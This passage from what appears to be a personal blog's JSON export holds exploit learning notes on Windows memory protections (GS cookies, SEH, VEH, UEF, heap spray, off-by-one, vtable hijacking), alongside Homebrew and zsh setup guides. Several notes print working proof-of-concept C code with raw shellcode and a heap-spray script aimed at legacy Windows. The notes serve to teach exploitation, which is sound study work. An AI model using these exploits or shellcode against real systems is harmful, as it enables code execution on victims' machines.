{ char dest[200]; if(i \u0026lt; 0x9995) { char* buf = s + i; *buf = *src; *(buf + 1) = *(src + 1); *(buf + 2) = *(src + 2); *(buf + 3) = *(src + 3); strcpy(dest, src); } } void main() { char* str = (char *)malloc(0x10000); test(str, 0xFFFF2FB8, Shellcode); } Description Note: The test environment is Windows XP SP3, the compilation version is Release version, the compiler is Visual Studio 2008, and the compilation option is Disable compilation optimization/0d When i is negative, it is possible to point to the .data section The test function has a typical stack overflow vulnerability Purpose: change the first four bytes of .data (the original cookie) to our fixed value while changing security_cookie(ebp-0x4) in the stack overflow Details Calculate security_cookie at the beginning of the function\n1 2 3 00401009 |. A1 00304000 mov eax,dword ptr ds:[__security_cookiedt\u0026gt; ; get the original cookie from the first four bytes of the 0x403000(.data) section 0040100E |. 33C5 xor eax,ebp ; use this value and eax to heterodynamically operate 00401010 |. 8945 FC mov [local.1],eax ; put this value at ebp-0x4 verify security_cookie when function will return\n1 2 3 4 5 6 7 8 9 10 11 12 ... 004010CA |\u0026gt; \\8B4D FC mov ecx,[local.1] ; take out the value of ebp-0x4 and put it in ecx 004010CD |. 33CD xor ecx,ebp ; put the value of ebp and ecx in the same operation 004010CF |. E8 3D000000 call TestCons.__security_check_cookieionF\u0026gt; ; call __security_check function to verify the cookie ... TestCons.__security_check: 00401111 \u0026gt; $ 3B0D 00304000 cmp ecx,dword ptr ds:[__security_cookiedt\u0026gt; ; Compare ecx with the first four bytes of 0x403000(.data) 00401117 . 75 02 jnz short TestCons.0040111B ; if different then jump to exception handling process 00401119 . f3:c3 rep retn ; return 0040111B \u0026gt; E9 AC020000 jmp TestCons.__report_gsfailureokienFilte\u0026gt; ; Exception handling process function ... ","date":"2020-11-11T16:45:00+08:00","permalink":"https://blog.moeomu.com/posts/exploit-learning-notes-012-gs-security-compilation/","title":"Exploit learning notes 012 GS security compilation"},{"content":"Please note the timeliness:This article was written on 2020/11/10\u0026amp;\u0026amp;This article was updated on 2021/07/02\nSource of this article: Moeomu\u0026rsquo;s blog\nInstall git Method 1: Install XCode Terminal:xcode-select --install Method 2: Go directly to the git website and download the macOS installer for git Install HomeBrew First download the original installer.sh jsDelivr CDN image\nRun it by entering the following command.\n1 2 3 4 5 git config --global url.\u0026#34;https://mirrors.ustc.edu.cn/homebrew-core.git\u0026#34;.insteadOf \u0026#34;https://github.com/Homebrew/homebrew-core\u0026#34; git config --global url.\u0026#34;https://mirrors.ustc.edu.cn/linuxbrew-core.git\u0026#34;.insteadOf \u0026#34;https://github.com/Homebrew/linuxbrew-core\u0026#34; git config --global url.\u0026#34;https://mirrors.ustc.edu.cn/brew.git\u0026#34;.insteadOf \u0026#34;https://github.com/Homebrew/brew\u0026#34; chmod +x install.sh HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles ./install.sh Cloning the Homebrew-Cask project via USTC\u0026rsquo;s git repository\ncd /usr/local/Homebrew/Library/Taps/homebrew git clone https://mirrors.ustc.edu.cn/homebrew-cask.git Check source configuration Checking the brew mirror source: git -C \u0026quot;$(brew --repo)\u0026quot; remote -v View homebrew-core mirror source: git -C \u0026quot;$(brew --repo homebrew/core)\u0026quot; remote -v View homebrew-cask mirror sources: git -C \u0026quot;$(brew --repo homebrew/cask)\u0026quot; remote -v The qualifying criteria is that the addresses of these sources are all USTC URLs Update brew update Install Oh-My-Zsh (not required) Update zsh: brew install zsh git clone oh-my-zsh project: git clone https://gitee.com/mirrors/oh-my-zsh.git Rename the project: mv oh-my-zsh .oh-my-zsh Copy the template to the home directory named .zshrc: cp .oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc Exit Terminal, start Terminal, success Configure Terminal (not required) Preferences-On startup, open-New window with description file-Homebrew Preferences-Description File-Homebrew-Text-Font-14 points Configure Terminal agent (not required) 1 2 export https_proxy=http://127.0.0.1:7809 export http_proxy=http://127.0.0.1:7809 ","date":"2020-11-10T19:43:00+08:00","permalink":"https://blog.moeomu.com/posts/homebrew-and-brewcask-installation/","title":"Homebrew and Brewcask installation"},{"content":"zsh install and config\nSource: Moeomu\u0026rsquo;s blog\nInstall zsh macOS: brew install zsh Linux Arch Linux: sudo pacman -S zsh Ubuntu: sudo apt install zsh Clone git repo China mainland: git clone https://gitee.com/mirrors/oh-my-zsh.git Global: git clone https://github.com/ohmyzsh/ohmyzsh.git config zsh set as default shell Set default shell: chsh -s /usr/bin/zsh Rename: mv oh-my-zsh .oh-my-zsh Set user profile: cp .oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc auto suggestions plugin git clone https://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions edit ~/.zshrc: plugins=(git)=\u0026gt;plugins=(git zsh-autosuggestions) ","date":"2020-11-10T19:43:00+08:00","permalink":"https://blog.moeomu.com/posts/ohmyzsh-installation-guide/","title":"OhMyZsh Installation Guide"},{"content":"Source: Moeomu\u0026rsquo;s blog\nFormatting string vulnerability Flaw in printf Example\n1 2 3 4 5 6 7 8 #include \u0026#34;stdio.h\u0026#34; void main() { int a = 44,b = 77; printf(\u0026#34;a=%d, b=%d\\n\u0026#34;,a,b); printf(\u0026#34;a=%d, b=%d\\n\u0026#34;); } The second call in the above code is missing the list of variables for the output data However, the second call does not cause a compilation error and the program executes normally Reading memory data with printf Example\n1 2 3 4 5 6 #include \u0026#34;stdio.h\u0026#34; int main(int argc, char ** argv) { printf(argv[1]); } When we pass a normal string to the program, we get a normal string But if it comes with a format control character, you can read the data on the stack Write data to memory with printf Example\n1 2 3 4 5 6 7 8 #include \u0026#34;stdio.h\u0026#34; int main(int argc, char ** argv) { int len_print = 0; printf(\u0026#34;before write: length=%d\\n\u0026#34;, len_print); printf(\u0026#34;Misaka:%d%n\\n\u0026#34;,len_print, \u0026amp;len_print); printf(\u0026#34;after write: length=%d\\n\u0026#34;, len_print); } The %n controller calculates the length of the output string and then writes it back to the len_print variable SQL injection attack Principle It stems from a flaw in PHP, ASP and other scripting languages when heaping user input data and parsing it It is not a binary vulnerability and will not be discussed here Windows security mechanism Flaw in Turing machine There is no clear distinction between code and data, so there are always problems For example, stack overflow attacks, shelling and deshelling techniques, morphing virus techniques Cross-site scripting attacks, SQL injection attacks are also caused by this flaw Changes in Windows Macro changes Windows Security Center was added Added firewall to Windows Web pop-ups and ActiveX control installation will be disabled without permission IE7 added a feature to filter counterfeit websites Added UAC (User Account Control) mechanism to prevent malicious software from being installed on the computer without permission or from making changes to the computer Integrated Windows Defender to block, control and remove spyware and malware Memory security changes Added SecurityCookie before the function return address using GS compilation technology, which first detects whether SecurityCookie is overwritten before the function returns and stack overflow becomes difficult Added the security check mechanism of heap SEH to effectively prevent most of the attacks of rewriting SEH and hijacking the process. Heap security mechanisms such as Heap Cookie and Safe Unlinking have been added to the heap, and the heap overflow is more restricted. DEP(Data Execution Protection) Data Execution Protection marks data sections as non-executable, preventing the execution of attack code in the stack, heap and data sections ASLR(Address Space Layout Randomization)Load address randomization technique disables classical stack overflow techniques by randomizing key addresses in the heap system SEHOP(Structured Exception Handler Overwrite Protection)SEH overwrite protection complements the heap SEH security mechanism by raising the SEH protection to the system level, making the SEH protection mechanism more effective Summary of Windows security mechanisms Windows XP Windows 2003 Windows Vista Windows 2008 Windows 7 GS Security Cookies √ √ √ √ √ Variable rearrangement √ √ √ √ √ Safety SEH SEH handle validation √ √ √ √ √ Heap Protection Safe disassembly √ √ √ √ √ Safety Fast Meter × × √ √ √ Heap Cookie √ √ √ √ √ Metadata Encryption × × √ √ √ DEP NX Support √ √ √ √ √ Permanent DEP × × √ √ √ Default OptOut × √ × √ × ASLR PEB, TEB √ √ √ √ √ Heap × × √ √ √ Stack × × √ √ √ Image × × √ √ √ SEHOP SEH chain validation × × √ √ √ ","date":"2020-10-25T18:50:00+08:00","permalink":"https://blog.moeomu.com/posts/exploit-learning-notes-011-other-types-of-exploits-and-windows-security-mechanisms/","title":"Exploit learning notes 011 other types of exploits and Windows Security Mechanisms"},{"content":"Disclaimer: The experimental environment is Windows 2000\nSource: Moeomu\u0026rsquo;s blog\nIntroduction Attacks against browsers often use a combination of heap and stack co-option vulnerabilities\nWhen there is an overflow vulnerability in the browser or in the ActiceX control it uses, an attacker can generate a special HTML file to trigger the vulnerability Whether it is a heap overflow or a stack overflow, the vulnerability can eventually gain an EIP when triggered Sometimes it can be difficult to know the full shellcode in the complex memory environment of the browser The JavaScript in the page can request heap memory, so the shellcode is laid out in the heap via JavaScript as a possibility How to locate the shellcode in the heap: HeapSpray Technical details When using Heap Spray, the EIP is usually pointed to the heap area 0x0C0C0C0C location, and then JavaScript is used to request the use of a large amount of heap memory and overwrite it with a memory slice containing 0x90 and shellcode Normally, JS allocates memory from low addresses to high addresses, so if you request more than 200MB of memory, 0x0C0C0C0C will be overwritten by the memory slice containing the shellcode, and as long as 0x90 in the memory slice can hit 0x0C0C0C0C, the shellcode can be executed JS code 1 2 3 4 5 6 7 8 9 10 11 12 13 var nop = unescape(\u0026#34;%u9090%u9090\u0026#34;); while(nop.length \u0026lt;= 0x100000/2) { nop+=nop; }//生成一个 1MB 大小充满 0x90 的数据块 nop = nop.substring(0, 0x100000/2 - 32/2 - 4/2 - shellcode.length - 2/2); var slide = new Arrary(); for (var i = 0; i \u0026lt; 200; i++) { slide[i] = nop + shellcode } Explanation Each memory slice is 1MB in size First generate a memory block of size 1MB and all filled with 0x90 Since Java fills the requested memory with some extra information, to ensure that the memory slice is 1MB, this space is subtracted We use 200 of these memory slices to cover the heap memory, as long as any nop area can cover 0x0C0C0C0C, it will work extra space\nsize description malloc header 32 byte heap block information string length 4 byte indicates the length of the string terminator 2 1 byte heap block information Practice To be continued ","date":"2020-10-25T17:56:00+08:00","permalink":"https://blog.moeomu.com/posts/exploit-learning-notes-010-heapspray/","title":"Exploit learning notes 010 HeapSpray"},{"content":"Disclaimer: The experimental environment is Windows XP SP3\nSource: Moeomu\u0026rsquo;s blog\nDifferent levels of SEH The smallest scope of exception handling is threads, each thread has its own SEH chain and uses its own SEH first when an error occurs There may be many threads in a process at the same time, and the process also consists of one that can handle global exception handling. When the thread\u0026rsquo;s own SEH is unable to fix the error, the process\u0026rsquo;s SEH will handle the exception. This exception handling may affect all threads under the process The operating system provides a default exception handling function for all programs. When all exception handling functions are unable to handle the error, this default exception handling function will be called eventually and the result will generally be displayed when the error dialog is to be given The following is a simple exception handling process First execute the SEH or exception handling function nearest to HANDING in the thread If it fails, try to execute the subsequent exception handling functions in the SEH chain in turn If all the exception handling functions in the SEH chain fail to handle the exception, the exception handling of the process will be executed If it still fails, the system default exception handling function will be called and the program crash dialog will pop up Exception handling for threads Threads try to handle exceptions sequentially by referring to the SEH chain through the TEB\nThe callback function used for exception handling has 4 parameters pExecpt: points to an important structure: EXCEPTION_RECORD, which contains several exception-related information, such as the type of the exception, the address where the exception occurred, etc. pFrame: points to the SEH structure in the stack frame pContext: points to the Context structure, which contains the state of all registers pDispatch: unknown Before the callback function is executed, the system stacks the information about the breakpoint when the above exception occurs. With these descriptions, the callback function can easily handle exceptions After the callback function returns, the operating system will decide what to do next based on the results returned. Exception handling functions can return two kinds of results 0(Exception Continue Excetutuon): means the exception was successfully handled and will return to the place where the exception occurred and continue to execute subsequent instructions 1(Exception Continue Search): the exception handling failed, it will search down the SEH chain for other functions that can be used for exception handling and try to handle them UNWIND operation When an exception occurs, the OS will search the SEH chain for the handle to handle the exception, and once found, the system will call the SEH exception handling functions that have been traversed again. The main purpose is to notify the previous SEHs that failed to handle the exception that the system has abandoned them and ask them to clean up the site to release resources, and then remove the SEH structure from the chain table. When ExceptionCode in the EXCEPTION_RECORD structure pointed to by pExcept is set to 0xC0000027(STATUS_UNWIND) and ExceptionFlags is set to 0x2(EH_UNWINDING), the callback function for the call is an unwind call This operation is implemented through an export function RtlUnwind in kernel.32. Before using the callback function, the system will determine if it is currently in debug state, and if it is, it will pass the exception to the debugger EXCEPTION_RECORD\n1 2 3 4 5 6 7 8 typedef struct _EXCEPTION_RECORD { DWORD ExceptionCode; DWORD ExceptionFlags; //异常标志位 struct _EXCEPTION_RECORD *ExceptionRecord; PVOID ExceptionAddress; DWORD NumberParameters; DWORD ExceptionInformation [EXCEPTION_MAXIMUM_PARAMETERS]; } EXCEPTION_RECORD; RtlUnwind\n1 2 3 4 5 6 void RtlUnwind( PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue ); Process exception handling All exceptions that occur in threads that are not handled by the thread or the latter debugger of the exception handling function will eventually be handed over to the process exception handling function\nThe callback function for process exception handling needs to be registered through the API function SetUnhandleExceptionFilter. There are 3 types of return values for this function 1(EXCEPTION_EXECUTE_HANDLER): means that the error is handled correctly and the program will exit. 0(EXCEPTION_CONTINUE_SEARCH): the error cannot be handled, and the error will be forwarded to the system default exception handling. -1(EXCEPTION_CONTINUE_EXECUTION): indicates that the error was handled correctly and execution will continue. Similar to the threaded exception handling, the system will recover the breakpoint condition at the time of the exception with the parameters of the callback function, but by this time the register value that caused the exception should have been fixed. SetUnhandleExceptionFilter\n1 2 3 LPTOP_LEVEL_EXCEPTION_FILTER SetUnhandledExceptionFilter( LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter ); System default exception handling UEF If the process exception handler fails or the program has no process exception handler, the system default exception handler UnhandledExceptionFilter() will be called, which is the ultimate exception handler UEF(Unhandled Exception Filter).\nMSDN refers to it as the \u0026ldquo;top-level exception handler\u0026rdquo;, i.e. the top-level exception handler, or the last exception handler used\nIn Windows 2000- Windows XP, this function will check the contents of the registry HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\AeDebug, the Auto item identifies whether the dialog box pops up, 1 means no pop up, just end the program. All others will pop up The Debugger item specifies the system default debugger Summary of exception flow CPU executes catching exceptions, kernel takes over control and starts kernel state exception handling Kernel exception handling is finished and control is handed over to user state The first exception handling function in the user state is the KiUserExceptionDispatcher() function in ntdll.dll. This function first checks if the program is in debug state, and if it is debugged, gives the exception to the debugger to handle Try to add VEH(Vectored Exception Handling) to handle exceptions In non-debugging state, call RtlDispatchException() function to iterate through the thread\u0026rsquo;s SEH chain, if the callback function for handling exceptions can be found, it will again iterate through the previously called SEH handle, i.e., unwind operation, to ensure the integrity of the exception handling mechanism If all the SEHs in the stack fail, the process has an exception handling function and will call this function If the custom process exception handling fails, the system default UEF will be called Other exception handling utilization ideas VEH utilization Starting from WindowsXP, a new type of exception handling has been added: VEH (Vectored Exception Handler) vectorized exception handling\nVEH and process exception handling is similar, are process-based, need to use the API to register callback functions Multiple VEHs can be handled, and the structures are linked in a bidirectional chain. Processing priority is second to debugger processing and higher than SEH processing Registering a VEH can enforce its position in the chain VEHs are stored in the heap unwind operation does not involve VEH process class exception handling VEH structures\n1 2 3 4 5 struct _VECTORED_EXCEPTION_NODE { DWORD m_pNextNode; DWORD m_pPreviousNode; PVOID m_pfnVectoredHandler; } VEH registration function\n1 2 3 4 PVOID AddVectoredExceptionHandler( ULONG FirstHandler, PVECTORED_EXCEPTION_HANDLER VectoredHandler ); If the heap overflow DWORD SHOOT is used to modify the pointer to the VEH header node, it can lead the program to execute the shellcode after the exception handling starts Attack the SEH header node in the TEB The SEH chain of the thread points to the closest SEH to the top of the stack through the first DWORD pointer in the TEB. If this pointer in the TEB is modified, it will direct the program to execute the shellcode only when the exception occurs\nLimitations Multiple threads exist in a process Each thread has a TEB The first TEB starts at 0x7FFDE000 The TEB of the new thread will follow the previous TEB, separated by 0x1000 bytes, growing towards the lower address of memory It is difficult for multi-threaded programs to determine which thread is the current thread and where the corresponding TEB is located, and the method of attacking the SEH header node in the TEB is generally used for single-threaded programs Although it is possible to create many threads or close a large number of threads to try to control the TEB arrangement, the multi-threaded state should not be obsessed with using the TEB\nAttacking the UEF Heap overflow with DOWRD SHOOT target pointing to the entry of the UEF and data being the entry address of the shellcode, then create an exception that can only be handled by the UEF\nCombined with the use of springboard technology can make the success rate of exploit higher When an exception occurs, the EDI often points to a place in the heap that is not far from the shellcode Overwriting the UEF handle with a CALL DWORD PTR [EDI + 0x78] instruction address will often allow the program to jump into the shellcode or CALL DWORD PTR [ESI + 0x4C] or CALL DWORD PTR [EBP + 0x74] will work Attack the function pointer in PEB ExitProcess() then needs to enter the critical section to synchronize the threads when cleaning up the scene, and will eventually call RtlEnterCriticalSection() and RtlLeaceCriticalSection() The address of the PEB is always the same, which is a better choice than the TEB off by one exploit Hierarchy of exploit techniques.\nBasic stack overflow exploit: hijacking the process with the return address Advanced stack overflow exploits: exploits that can only partially flood the EBP but cannot reach the return address, such as the off by one exploit that occurs when the strncpy function is misused Heap overflow and format string exploits Exploits Code snippet\n1 2 3 4 5 6 7 8 9 10 11 12 void off_by_one(char * input) { char buf[200]; int i = 0, len = 0; len = sizeof(buf); for(i = 0; input[i]\u0026amp;\u0026amp;(i \u0026lt;= len); i++) { buf[i] = input[i]; } } This function tries to prevent array overruns during string copying, but the loop i \u0026lt;= len goes wrong in the boundary control and may overflow by one byte We can control EBP in the range of 255 bytes and possibly some important parameters of the program Attacking C++ virtual functions Theory A member function of a C++ class is a virtual function if it is modified with the virtual keyword when it is declared A class may consist of many virtual functions The entry address of the virtual function is stored in the virtual table (Vtable). When an object uses a virtual function, it first finds the virtual table by using the virtual table pointer, and then takes the final function entry address from the virtual table to call it The pointer to the virtual table is stored in the object\u0026rsquo;s memory space, followed by other member variables Dummy functions can only be called dynamically by reference to an object pointer Try When a member variable in an object overflows, there is an opportunity to modify the virtual table pointer in the object or modify the virtual function pointer in the virtual table This makes it possible to execute shellcode code attempts\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 /* Test on Windows XP SP3 without any other patch. */ #include \u0026#34;windows.h\u0026#34; #include \u0026#34;iostream.h\u0026#34; char shellcode[]= \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\xAC\\xBA\\x40\\x00\u0026#34;; // set fake virtual function pointer class Failwest { public: char buf[200]; virtual void test(void) { cout \u0026lt;\u0026lt; \u0026#34;Class Vtable::test()\u0026#34; \u0026lt;\u0026lt; endl; } }; Failwest overflow, *p; void main(void) { char * p_vtable; p_vtable = overflow.buf - 4; // point to virtual table cout \u0026lt;\u0026lt; \u0026#34;Buf Address:\u0026#34; \u0026lt;\u0026lt; \u0026amp;overflow.buf \u0026lt;\u0026lt; endl; // reset fake virtual table to 0x0040BB5C // the address may need to ajusted via runtime debug p_vtable[0] = 0x5C; p_vtable[1] = 0xBB; p_vtable[2] = 0x40; p_vtable[3] = 0x00; strcpy(overflow.buf,shellcode); // set fake virtual function pointer p = \u0026amp;overflow; p-\u0026gt;test(); } Description The dummy table pointer is located before the member variable char buf[200], the program locates this pointer by p_vtable = overflow.buf - 4 Modify the virtual table to point to the buffer 0x0040BB5C, this is the end of the shellcode, fill in 0x0040BAAC which is the starting address of the shellcode, the program will jump to execute the shellcode This way is neither stack overflow nor heap overflow, because the memory space of the object is located in the heap, but it is a continuous linear overwrite space, so it should be accurately called \u0026ldquo;array overflow\u0026rdquo; or \u0026ldquo;continuous overwrite\u0026rdquo; It may be easier to attack the virtual table using DWORD SHOOT ","date":"2020-10-25T15:09:00+08:00","permalink":"https://blog.moeomu.com/posts/exploit-learning-notes-009-windows-exceptions-in-depth/","title":"Exploit learning notes 009 Windows exceptions in depth"},{"content":"Disclaimer: The experimental environment is Windows 2000\nSource: Moeomu\u0026rsquo;s blog\nSEH Overview SEH is an exception handler structure (Structure Exception Handler), which is an important data structure used by the Windows exception handling mechanism. Each SEH contains two DWORD pointers: the SEH link table pointer and the exception handler handle, totaling 8 bytes The SEH structure is stored on the stack When a thread is initialized, a SEH is automatically installed on the stack as the default exception handler for the thread If the program source code uses an exception handling mechanism such as try-except, the compiler eventually implements exception handling by installing a SEH on the current function stack frame There are usually multiple SEHs on the stack at the same time Multiple SEHs in the stack are strung together in a single chain from the top to the bottom of the stack by means of a chain table pointer, and the SEH at the top of the chain table is identified by a pointer at the TEB0 byte offset When an exception occurs, the operating system will terminate the program and first remove the SEH closest to the top of the stack from the 0 offset of the TEB to handle the exception using the code pointed to by the exception handling function handle When the exception handler closest to the scene of the incident fails to run, it will try other exception handling functions in order down the SEH chain If all the exception handling functions installed in the program fail to handle the exception, the system will use the default exception handling function, which will pop up an error dialog and force the program to close SEH utilization idea SEH is stored in the stack, and the data in the overflow buffer can flood the SEH Change SEH entry to shellcode start address The wrong stack frame or heap block data will trigger an exception after the overflow After Windows starts handling exceptions, shellcode is executed as an exception handling function Stack utilization test for SEH NOP test Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; char shellcode[] = \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; // next SEH Record \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; // SE Handler Function Address \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; // Nothing \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; // Nothing \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; // EBP \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; // Return Address ; DWORD MyExceptionhandler(void) { printf(\u0026#34;got an exception, press Enter to kill process!\\n\u0026#34;); getchar(); ExitProcess(1); return 0; } void test(char* input) { char buf[200]; int zero = 0; __asm int 3 // used to break process for debug __try { strcpy(buf, input); // overrun the stack zero = 4 / zero; // generate an exception } __except(MyExceptionhandler()){} } void main() { test(shellcode); } Observe 0x0012FE98 address is the starting location of the shellcode There are 3 SEHs installed in the current thread, the closest to the top of the stack is at 0x0012FF68, which is the first SEH called The address we want to overwrite is 0x0012FF6C, which is the address of the processing function, the content can be filled in the starting address of the ShellCode Actual test code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; char shellcode[]= \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; // Next SEH Record \u0026#34;\\x98\\xFE\\x12\\x00\u0026#34;; // SEH Handler DWORD MyExceptionhandler(void) { printf(\u0026#34;got an exception, press Enter to kill process!\\n\u0026#34;); getchar(); ExitProcess(1); return 0; } void test(char * input) { char buf[200]; int zero=0; _try { strcpy(buf,input); //overrun the stack zero=4/zero; //generate an exception } _except(MyExceptionhandler()){} } void main() { test(shellcode); } Watch Popup MessageBox dialog successfully SEH\u0026rsquo;s heap utilization test Actual test Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 #include \u0026lt;windows.h\u0026gt; char shellcode[]= \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; 